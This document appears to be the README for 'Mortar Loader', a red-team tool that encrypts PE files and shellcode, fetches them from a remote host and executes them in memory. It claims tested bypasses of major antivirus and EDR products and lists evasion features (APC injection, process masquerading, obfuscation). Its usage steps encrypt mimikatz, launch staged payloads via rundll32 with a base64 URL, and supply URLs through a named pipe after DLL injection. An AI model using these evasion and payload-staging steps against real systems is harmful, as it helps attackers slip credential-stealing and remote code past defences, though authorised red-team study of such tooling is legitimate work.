[<img src="https://img.shields.io/twitter/follow/zux0x3a?label=follow&style=social">](https://twitter.com/zux0x3a)

# Mortar Loader 

Red teaming evasion technique to defeat and divert detection and prevention of security products.Mortar Loader performs encryption and decryption PE/Shellcode inside the memory streams and execute it leveraging several injection techniques . 
Mortar is able to bypass modern anti-virus products and advanced XDR solutions and it has been tested and confirmed bypass for the following: 

* Kaspersky  :heavy_check_mark:
* ESET AV / EDR :heavy_check_mark:
* Malewarebytes :heavy_check_mark:
* Mcafee :heavy_check_mark:
* Windows defender :heavy_check_mark:
* Cylance :heavy_check_mark:
* TrendMicro :heavy_check_mark:
* Bitdefender :heavy_check_mark:
* Norton Symantec :heavy_check_mark:
* Sophos EDR :heavy_check_mark:


##  Updated features 

The newer version release (v3) has been released with the following features : 

* Fileless execution with remote staged encrypted binary or shellcode.
* Early Bird APC injection.
* Process masquerading.
* Supports Named Pipes.
* Strings and function calls obfuscation.
* Mortar covert reload subroutine.
* Delay execution techniques.

For more technical description, refer to the following blogpost : https://kpmg.com/nl/en/home/insights/2023/12/mortar-loader.html 

## Usage 

### Encryptor 

The encryptor encrypt C ShellCode and PE binaries and write the output into .enc file. 
you are allowed to use any payload(MSF/cobalt/Havoc..etc) as you prefer as long it is x64 arch and not RAW. 

```
root@kali>./encryptor -f mimikatz.exe -o bin.enc 
root@kali>./encryptor -f shellcode.c -o bin.enc 
```

### Mortar Loader Library

The newer release leverage several techniques combined with remote payload fetching, recommend to refer to following blogpost to get more insights. 

for quick instructions 

```
# PE Forking

1. host your encrypted binary on remote host. 
2. encode the final URL with base64. 
3. rundll32.exe agressor.dll,viewlogs [BASE64 URL].
4. covert reload subroutine technique is enabled. 
```

currently supports early bird injection in combination with Named Pipes to receive variables for final execution.  
```
1. inject Mortar DLL into remote process( DLL injection, Hijacking, sideloading).
2. connect into the named pipe to supply your URL 
   echo {BASE64 URL} > \\.\pipe\moj_ML_ntsvcs 
3. payload will be executed once valid value has been recieved. 
```

## Compiling 

the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads).

for the encryptor you you can download it from the release section or compile it easily with lazarus ide. 

```
#Debian & Ubuntu 

apt install fpc 
apt install lazarus-ide 

```

## Publications 

* The v1 release : https://0xsp.com/security%20research%20&%20development%20(SRD)/defeat-the-castle-bypass-av-advanced-xdr-solutions
* Mortar Loader v2 features : https://0xsp.com/offensive/mortar-loader-v2/
* CrestCon Asia 2021 talk : https://www.youtube.com/watch?v=H7EMBz7GLMk

## Sponsor ?
the development of mortar or any shared project is an outcome from my personal time.
- you show continues appreciation of my work. 
- you will get early access to pre-release. 
- ask questions / will be answered. 
